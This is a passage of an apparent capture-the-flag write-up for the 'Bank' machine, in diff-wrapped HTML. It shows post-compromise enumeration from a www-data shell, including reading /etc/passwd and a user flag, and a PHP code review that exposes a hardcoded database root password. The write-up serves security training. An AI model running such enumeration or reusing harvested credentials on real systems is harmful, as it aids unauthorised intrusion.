+</span><span class="z-text z-plain">-rw-r--r--  1 root root 1394 Apr 25  2015 usr.sbin.rsyslogd
+</span><span class="z-text z-plain">-rw-r--r--  1 root root 1455 Feb 21  2017 usr.sbin.tcpdump
+</span></code></pre>
+<p>That's pretty classic.</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 ::1/128 scope host 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 00:50:56:b9:7c:8c brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 10.10.10.29/24 brd 10.10.10.255 scope global eth0
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 dead:beef::250:56ff:feb9:7c8c/64 scope global dynamic 
+</span><span class="z-text z-plain">       valid_lft 86391sec preferred_lft 14391sec
+</span><span class="z-text z-plain">    inet6 fe80::250:56ff:feb9:7c8c/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span></code></pre>
+<p>So there's only the loopback interface and the Ethernet interface.</p>
+<h2 id="hostname">Hostname</h2>
+<p>What is Bank's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">bank
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all the local users that have a console.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/passwd</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span><span class="z-text z-plain">chris
+</span></code></pre>
+<p>There's only <code>root</code> and <code>chris</code> (us).</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's retrieve the list of all local groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> getent group</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">bind
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">chris
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">fuse
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">landscape
+</span><span class="z-text z-plain">libuuid
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lpadmin
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">mlocate
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sambashare
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">ssl-cert
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>That's pretty classic.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>Let's see to which groups we currently belong</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">Bankwww-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> groups</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>We only belong to the default group for our user.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>We can try to check for our home folder, but since we are not a real user, we don't have any.</p>
+<p>We have access to <code>chris</code>'s home folder though:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /home/chris</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-xr-x 3 chris chris 4096 Jan 11  2021 .
+</span><span class="z-text z-plain">drwxr-xr-x 3 root  root  4096 Jan 11  2021 ..
+</span><span class="z-text z-plain">lrwxrwxrwx 1 root  root     9 Jan 11  2021 .bash_history -&gt; /dev/null
+</span><span class="z-text z-plain">-rw-r--r-- 1 chris chris  220 May 28  2017 .bash_logout
+</span><span class="z-text z-plain">-rw-r--r-- 1 chris chris 3637 May 28  2017 .bashrc
+</span><span class="z-text z-plain">drwx------ 2 chris chris 4096 Jan 11  2021 .cache
+</span><span class="z-text z-plain">-rw-r--r-- 1 chris chris  675 May 28  2017 .profile
+</span><span class="z-text z-plain">-r--r--r-- 1 chris chris   33 Dec 31 14:58 user.txt
+</span></code></pre>
+<p>There's the user flag file! And we have access to it. Let's get it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bank:/var/www/bank/uploads$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /home/chris/user.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">c4a83bcaf0ac74d106ecc4c0f3f5ab39
+</span></code></pre>
+<h2 id="command-history">Command history</h2>
+<p>We can try to check the history of the commands <code>chris</code> ran, but it's discarded into <code>/dev/null</code>.</p>
+<h2 id="website-code-review">Website code review</h2>
+<p>Let's review the content of the website about the bank, located at <code>/var/www/bank</code>.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-keyword z-operator z-comparison z-php">&lt;</span><span class="z-constant z-other z-php">SNIP</span><span class="z-keyword z-operator z-comparison z-php">&gt;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>pageName</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">Dashboard</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-meta z-include z-php"><span class="z-keyword z-control z-import z-include z-php">include</span> <span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">./inc/header.php</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-meta z-include z-php"><span class="z-keyword z-control z-import z-include z-php">require</span> <span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">./inc/user.php</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>user</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-keyword z-other z-new z-php">new</span> <span class="z-meta z-path z-php"><span class="z-support z-class z-php">User</span></span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-meta z-include z-php"><span class="z-keyword z-control z-import z-include z-php">include</span> <span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">./inc/footer.php</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php">
+</span></span></span></span></code></pre>
+<p>The <code>index.php</code> page is not really interesting, it mostly includes other files.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-keyword z-operator z-comparison z-php">&lt;</span><span class="z-constant z-other z-php">SNIP</span><span class="z-keyword z-operator z-comparison z-php">&gt;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-meta z-function-call z-php"><span class="z-support z-function z-session z-php">session_name</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">HTBBankAuth</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-meta z-function-call z-php"><span class="z-support z-function z-session z-php">session_start</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-keyword z-control z-php">if</span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-construct z-php">empty</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-safer z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_SESSION</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">username</span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span><span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-meta z-function-call z-php"><span class="z-support z-function z-network z-php">header</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">location: login.php</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-keyword z-control z-php">return</span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></span></code></pre>
+<p>The <code>header.php</code> is responsible for redirecting to the <code>/login.php</code> page if the <code>username</code> session parameter is empty.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-keyword z-operator z-comparison z-php">&lt;</span><span class="z-constant z-other z-php">SNIP</span><span class="z-keyword z-operator z-comparison z-php">&gt;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-meta z-class z-php"><span class="z-storage z-type z-class z-php">class</span> <span class="z-entity z-name z-class z-php">User</span> <span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-php">{</span></span></span><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php">        <span class="z-meta z-function z-php"><span class="z-storage z-type z-function z-php">function</span> <span class="z-entity z-name z-function z-php">login</span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function z-parameters z-php"><span class="z-meta z-group z-php"><span class="z-variable z-parameter z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>email</span><span class="z-punctuation z-separator z-php">,</span> <span class="z-variable z-parameter z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>password</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php"><span class="z-punctuation z-section z-block z-begin z-php">{</span></span></span><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>mysql</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-keyword z-other z-new z-php">new</span> <span class="z-meta z-path z-php"><span class="z-support z-class z-builtin z-php">mysqli</span></span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">localhost</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span>, <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">root</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span>, <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">!@#S3cur3P4ssw0rd!@#</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span>, <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">htbbank</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>email</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>mysql</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">real_escape_string</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>email</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>password</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-string z-php">md5</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>password</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-class z-php"><span class="z-meta z-block z-php"><span class="z-meta z-function z-php"><span class="z-meta z-block z-php">            <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>result</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>mysql</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">query</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-variable z-language z-star z-sql">*</span> <span class="z-keyword z-other z-DML z-sql">FROM</span> users <span class="z-keyword z-other z-DML z-sql">WHERE</span> email <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>email</span><span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span> <span class="z-keyword z-operator z-logical z-sql">AND</span> password <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>password</span><span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span></span></span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
